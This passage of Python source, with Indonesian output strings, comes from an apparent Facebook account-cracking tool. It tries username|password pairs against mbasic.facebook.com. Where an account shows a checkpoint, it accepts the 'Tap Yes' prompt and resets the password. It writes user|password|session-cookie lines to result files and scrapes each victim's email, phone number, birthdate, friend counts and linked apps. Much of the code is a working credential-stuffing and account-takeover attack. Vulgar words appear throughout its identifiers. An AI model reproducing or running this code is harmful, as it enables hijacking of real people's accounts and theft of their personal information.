		print(f"\r{Q}[{C}{str(bz)}{Q}] Sedang Check Opsi Akun : {M}{user}|{pw}{Q}")
		print(f"\r{jarak}{war}{M}Kata Sandi Salah !          {P}\n")
def ubah_pw(session,response,link2):
	dat,dat2={},{}
	but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
	for x in response("input"):
		if x.get("name") in but:
			dat.update({x.get("name"):x.get("value")})
	ubahPw=session.post(url+link2.get("action"),data=dat).text
	resUbah=par(ubahPw,"html.parser")
	link3=resUbah.find("form",{"method":"post"})
	but2=["submit[Next]","nh","fb_dtsg","jazoest"]
	if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
		for b in resUbah("input"):
			if b.get("name") in but2:
				dat2.update({b.get("name"):b.get("value")})
		dat2.update({"password_new":"".join(pwBaru)})
		an=session.post(url+link3.get("action"),data=dat2)
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		print(f"\r{jarak}{jarak}{Q}[{I}âœ“{Q}]{I} AKUN INI TAP YES{Q}\n{jarak}{jarak}{Q}[{I}âœ“{Q}]{I} {user}|{''.join(pwBaru)}|{coki}{Q}\n",end="")
		bokep_japan_yang_terbaru("TAP", user, "".join(pwBaru), "")
		open("Hasil/Akun-Tap-Yes.txt", "a").write(user+"|"+"".join(pwBaru)+"|"+coki+"\n")
		if "checkpoint" not in coki:
			get_infoo(session,coki)
			cek_apk(session,coki)
		else:
			print("")

def get_infoo(session,coki):
	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:
		nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:
		nomer = ""
	try:
		email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:
		email=""
	try:
		ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:
		ttl=""
	try:
		teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

	except:
		teman = ""
	try:
		pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:
		pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	print(f"{jarak}â•­â”€â”€[{I}âœ“{P}] Name Account       : {K}{nama}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Number of Friends    : {K}{teman}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Email Aktif     : {K}{email}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}â•°â”€â”€[{I}âœ“{P}] Tanggal Lahir   : {K}{ttl}{P}")
def ubah_username_to_id(user):
	try:
		if user == "me":
			memek = "me"
		else:
			payload = {"fburl": "https://free.facebook.com/{}".format(user), "check": "Lookup"}
			if "facebook" in user:
				payload = {"fburl": user, "check": "Lookup"}
			mmk = requests.post("https://lookup-id.com/", data=payload).content
			xxx = par(mmk, "html.parser")
			idt = xxx.find("span", id="code")
			asw = idt.text
			memek = asw
		return memek
	except:
		return user
def text_random():
	contol = uuid.uuid4().hex[:10].upper()
	return contol

def cek_apk(session,coki):
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki,"user-agent":"Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		print(f"{jarak}{war}Aplikasi Yang Terkait*")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			print(f"{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *")
		else:
			print(f"{jarak}{jarak}{war}Aplikasi Aktif*")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				print(f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			print(f"{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *")
		else:
			hit1,hit2=0,0
			print(f"{jarak}{jarak}{war}Aplikasi Kedaluwarsa*")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				print(f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}")
				hit2+=1
	else:
		print(f"{jarak}{war}{M}Cookies Error !")
	print("")

def cek_cookies_by_risky(userr, cokii, memek_mamak_yayan):
	kntl_yayan = ""
	user = userr
	coki = kukis_v1(cokii)
	akun_nn = memek_mamak_yayan
	session = req.Session()


	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:nomer = ""
	try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:email=""
	try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:ttl=""
	try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
	except:teman = ""
	try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	kntl_yayan += (f"{jarak}â•­â”€â”€[{I}âœ“{P}] Nama Akun       : {K}{nama}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Email Aktif     : {K}{email}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}â•°â”€â”€[{I}âœ“{P}] Tanggal Lahir   : {K}{ttl}{P}\n")

	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		kntl_yayan += (f"{jarak}{war}Aplikasi Yang Terkait*\n")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			kntl_yayan += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *\n")
		else:
			kntl_yayan += (f"{jarak}{jarak}{war}Aplikasi Aktif*\n")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				kntl_yayan += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			kntl_yayan += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *\n")
		else:
			hit1,hit2=0,0
			kntl_yayan += (f"{jarak}{jarak}{war}Aplikasi Kedaluwarsa*\n")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				kntl_yayan += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
				hit2+=1
	else:
		kntl_yayan += (f"\r{jarak}{jarak}{war}{M}Cookies Error !\n")
	print(akun_nn+"\n"+kntl_yayan)



def cek_apk_fast(session,coki):
	global mem
	hit1, hit2 = 0,0
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
		mem += (f"{jarak}{war}Aplikasi Yang Terkait*\n")
		if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
			mem += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Aktif Yang Terkait *\n")
		else:
			mem += (f"{jarak}{jarak}{war}Aplikasi Aktif*\n")
			apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
			ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
			for muncul in apkAktif:
				hit1+=1
				mem += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {I}{muncul} {C}{ditambahkan[hit2]}{Q}\n")
				hit2+=1
		if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
			mem += (f"{jarak}{jarak}{war}Tidak Ada Aplikasi Kedaluwarsa Yang Terkait *\n")
		else:
			hit1,hit2=0,0
			mem += (f"{jarak}{jarak}{war}Aplikasi Kedaluwarsa*\n")
			apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
			kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
			for muncul in apkKadaluarsa:
				hit1+=1
				mem += (f"{jarak}{jarak}{jarak}  {Q}[{C}{hit1}{Q}] {K}{muncul} {U}{kadaluarsa[hit2]}{Q}\n")
				hit2+=1
	else:
		mem += (f"{jarak}{war}{M}Cookies Error !\n")
	mem += ("\n")

def get_infoo_fast(session,coki):
	global mem
	get_id = session.get("https://mbasic.facebook.com/profile.php",cookies={"cookie":coki}).text
	nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
	response = session.get("https://mbasic.facebook.com/profile.php?v=info",cookies={"cookie":coki}).text
	response2 = session.get("https://mbasic.facebook.com/profile.php?v=friends",cookies={"cookie":coki}).text
	response3 = session.get(f"https://mbasic.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies={"cookie":coki}).text
	response4 = session.get(f"https://mbasic.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies={"cookie":coki}).text
	try:
		nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
	except:
		nomer = ""
	try:
		email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
	except:
		email=""
	try:
		ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
	except:
		ttl=""
	try:
		teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]

	except:
		teman = ""
	try:
		pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
	except:
		pengikut = ""
	try:
		tahun = ""
		cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
		for nenen in cek_thn:
			tahun += nenen+", "
	except:pass

	mem += (f"{jarak}â•­â”€â”€[{I}âœ“{P}] Nama Akun       : {K}{nama}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Jumlah Teman    : {K}{teman}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Jumlah Pengikut : {K}{pengikut}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Email Aktif     : {K}{email}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Nomor Aktif     : {K}{nomer}{P}\n{jarak}â”œâ”€â”€[{I}âœ“{P}] Tahun Akun      : {K}{tahun}{P}\n{jarak}â•°â”€â”€[{I}âœ“{P}] Tanggal Lahir   : {K}{ttl}{P}")
def log_hasil(user, pasw):
    global mem
    mem = ""
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(Q,M,Q)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            mem += (f"\r{Q}[{M}!{Q}]{M}Akun Ini Kenak Sesi New\n")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('Hasil/OK-'+durasi+'.txt', 'a').write(f"{user}|{pasw}|{coki}\n")
            mem += (f"\r{Q}[{I}âœ“{Q}]{I} Selamat Akun Ini Tidak Check Point\n");mem +=(f"\r{war}{I}Sedang Check Aplikasi !!{Q}\n");time.sleep(0.03)
            cek_apk_fast(session,coki)
            get_infoo_fast(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    mem += (f"\r{Q}[{I}âœ“{Q}]{I} Selamat Akun Ini Tap Yes\n");mem += (f"\r{war}Mohon Tunggu Sebentar, Sedang Ubah Kata Sandi, Dan Check Aplikasi\n");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "DUMAI-991"
                    mem += (f"\r{Q}[{I}âœ“{Q}]{I} Selamat Akun Ini Tap Yes");mem += (f"\r{war}Mohon Tunggu Sebentar, Sedang Ubah Kata Sandi, Dan Check Aplikasi\n");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                mem += (f"{war}Maaf Akun Ini A2F On")
            else:
                open('Hasil/Error.txt', 'a').write(f"{user}|{pasw}\n")
                mem +=(f"{war}Terjadi Masalah Terhadap Akun")
        else:
            open(f'Hasil/CP-'+durasi+'.txt', 'a').write(f"{user}|{pasw}\n")
            mem += ("%s[%s!%s] Terdapat %s Opsi \n"%(N,K,N,len(cek)))
        for opt in range(len(cek)):
            mem += (f"{jarak}{Q}[{C}{str(opt+1)}{Q}] "+cek[opt]+"\n")
    else:
        mem +=(f"{war}{M}Kata Sandi Telah DiUbah, Atau Salah Kata Sandi{Q}\n")
        open('Hasil/Gagal-Login.txt', 'a').write(f"{user}|{pasw}\n")
    print("\n"+war+user+"|"+pasw+"\n"+mem)
def ubah_pw_fast(session,response,link2,user,mmk):
    global mem
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        mem +=(f"\r{jarak}{N}[{I}âœ“{N}] Berhasil Mengubah Kata Sandi Menjadi :\n{jarak}{N}[{I}âœ“{N}]{I} {user}|{''.join(mmk)}|{coki}{N}")
        open('Hasil/Akun-Tap-Yes.txt', 'a').write(f"{user}|{''.join(mmk)}|{coki}\n")
        cek_apk_fast(session,coki)
        get_infoo_fast(session,coki)

def log_hasill(user, pasw, ttll):
    global ua
    lp = ""
#    ua = "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
    host = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": host,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": host+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        lp += (M+"Akun Ini KeSpam !!"+Q+"\n")
    if "c_user" in ses.cookies:
        lp += (I+"Akun Ini Tidak Check Poits\n")
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(host+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        if(str(len(ngew))=="0"):
            lp += (I+"Akun Ini Hooo Yess (Tap Yes)"+Q+"\n")
            open("Hasil/Akun_Tap_Yes.txt","a+").write("{}|{}\n".format(user,pasw))
            bokep_japan_yang_terbaru("TAP", user, pasw, "-")
        else:
            lp += ("Tersedia %s Opsi \n"%(str(len(ngew))))
        for opt in range(len(ngew)):
            lp += ("      "+str(opt+1)+". "+ngew[opt]+"\n")
    elif "login_error" in str(run):
        oh = run.find("div",{"id":"login_error"}).find("div").text
        lp += ("%s%s%s\n"%(U,oh,Q))
    else:
        lp += (M+"Kata Sandi Sudah DiUbah !"+Q+"\n")
    print("\r"+war+K+user+"|"+pasw+" | "+ttll+Q+"\n"+war+lp+"            ",end=" >>KIKY")

def koki_apk(kukis_mama):
#	kiko = []
	try:
		kikis = kukis_mama.split(";")
		c_user = kikis[0]
		all_kus = kukis_mama.split(c_user+";")[1]
		coki_coki = (all_kus+";"+c_user)
		kiko = (coki_coki)
		return kiko
	except:
		return kukis_mama
#	print(kiko)

def dump_name(kukis):
	ses_ = requests.Session()
	url = "https://mbasic.facebook.com/search/people/?q=Risky"
	dat_game = ses_.get(url,cookies={'cookie':kukis})
	datagame = par(dat_game.content,'html.parser')
	form_    = datagame.find('form',method='post')
	data_tex = datagame.text
	print(data_tex)
	open("tes.py","w").write(data_tex)

def cek_apk_v1(kukis):
    apk = []
    ak = 0
    ek = 0
    ses_ = requests.Session()
#    print(kukis)
    url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
    dat_game = ses_.get(url,cookies={'cookie':kukis})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    data_tex = datagame.text
#    print(data_tex)
    if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau" in data_tex:
        apk.append(f"\n{jarak}{war}{M}Tidak Ada Aplikasi Yang Terkait {Q}({U}APK AKTIF{Q}){Q}")
    else:
        apk.append(f"\n{jarak}{war}{I}Aplikasi Yang Terkait {Q}({U}APK AKTIF{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
                ditambah = celengg.replace(celeng+"Ditambahkan"," DiTambahkan")
                ak += 1
                apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{U}{ditambah}{Q}')
            except:
                try:
                    celeng = asu.find('span').text
                    ak += 1
                    apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{Q}')
                except:pass

    url2 = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
    dat_game = ses_.get(url2,cookies={'cookie':kukis})
    datagame = par(dat_game.content,'html.parser')
    form_    = datagame.find('form',method='post')
    data_texx = datagame.text
#    print(data_texx)
    if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in data_texx:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{M}Tidak Ada Aplikasi Yang Terkait{Q} ({K}APK Kedaluwarsa{Q}){Q}")
    else:
        apk.append(f"\n")
        apk.append(f"\n{jarak}{war}{I}Aplikasi Yang Terkait {Q}({K}APK Kedaluwarsa{Q}){Q}")
        for asu in form_.find_all("h3"):
            try:
                celeng = asu.find('span').text
                celengg = asu.find('div').text
                ditambah = celengg.replace(celeng+"Kedaluwarsa"," Kedaluwarsa")
                ek += 1
                apk.append(f'\n{jarak}{jarak}[{ek}] {K}{celeng}{C}{ditambah}{Q}')
            except:
                try:
                    celeng = asu.find('span').text
                    ak += 1
                    apk.append(f'\n{jarak}{jarak}[{ak}] {I}{celeng}{Q}')
                except:pass
    print(''.join(apk))
def visitor():
	try:
		datax = open(".datame", "r").read()
		datax = datax.split("User=")[1]
		try:
			ses_ = requests.Session()
			bhb = ""
			jhg = 1

			utl = "https://komarev.com/ghpvc/?username=jmbf&color=yellow"
			data_te = ses_.get(utl)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
		except:
			le = ("NONE")
		#jalan("[++] Selamat Datang User Jmbf Yang Ke "+I+str(datax)+Q+" Dari "+I+str(le)+Q+" User Jmbf");time.sleep(2)
	except:
		try:
			url_vis = "https://github.com/Dumai-991/jmbf/blob/Xnxx/README.md"
			url_visi = "https://camo.githubusercontent.com/6123034813c11ae497e730dcba77572e83eb96016e5528c8a6f789b27891b99c/68747470733a2f2f6b6f6d617265762e636f6d2f67687076632f3f757365726e616d653d6a6d626626636f6c6f723d79656c6c6f77"
			ses_ = requests.Session()
			bhb = ""
			jhg = 1


			data_te = ses_.get(url_vis).text.strip()
			data_te = ses_.get(url_visi)
			gbl = par(data_te.content,'html.parser')
			for n in gbl.find_all("text"):
				bhb += (str(n))
			lee = bhb.split('y="14">')
			le = len(lee)
			le -= 1
			le = (lee[le].replace("</text>",""))
			hasil_ = (str(le))
			kiki = open(".datame", "w")
			kiki.write("User="+hasil_)
			kiki.close()
		except:pass

def gabung_pw():
	pq = ""
	bq = ""
	vv = 0
	cc = 0
	jalan("\n"+war+"Use a comma as separator")
	jalan(war+"Examples of Passwords that Admin Often Use :)")
	jalan(war+'Password '+I+'pakistan'+Q+' : pakistan,786786')
	jalan(war+'Password '+I+'pakistan OLD'+Q+' : pakistan123,pakistan,123456')
	paw = input(war+"Password : ").split(",")
	pakQ = open(".paww", "w")
	for n in paw:
		if len(n) <= 5:
			pq += (" "+n)
			vv += 1
		else:
			bq += (" "+n)
			cc += 1
			pakQ.write(n+"|")
	pakQ.close()
	if pq == "":
		pass
	else:
		jalan(war+"There is "+M+str(vv)+Q+" Unusable Password !")
	if bq == "":
		pass
	else:
		jalan(war+"There is "+I+str(cc)+Q+" Unusable Password !\n")
def cek_konek():
	try:
#		cek_jaringan = requests.post("https://github.com/Dumai-991/Dumai-991")
		cek_jaringan = requests.get("https://www.google.com/search?q=jmbf&oq=jmbf&aqs=chrome..69i57j69i60j0i512l3j0i30l3.1092j0j1&sourceid=chrome-mobile&ie=UTF-8")
		pass
	except requests.exceptions.ConnectionError:
		sys.stdout.write(f'\r{war}Your Network Is Disconnected !!'),
		sys.stdout.flush()
		cek_konek()
try:
	pln_tkn = open(".login.txt", "r").read()
except IOError:pass 	

#### BUAT SANDI :V
def buat_sandi():
	jalan(war+"Please choose a password, which you think is good !")


def buat_angka():
	kontol_hakiki = open(".paska", "w") # KONTOL HAKIKI
	print()
	jalan(war+M+"Enter a behind name, and use a comma as a separator"+Q)
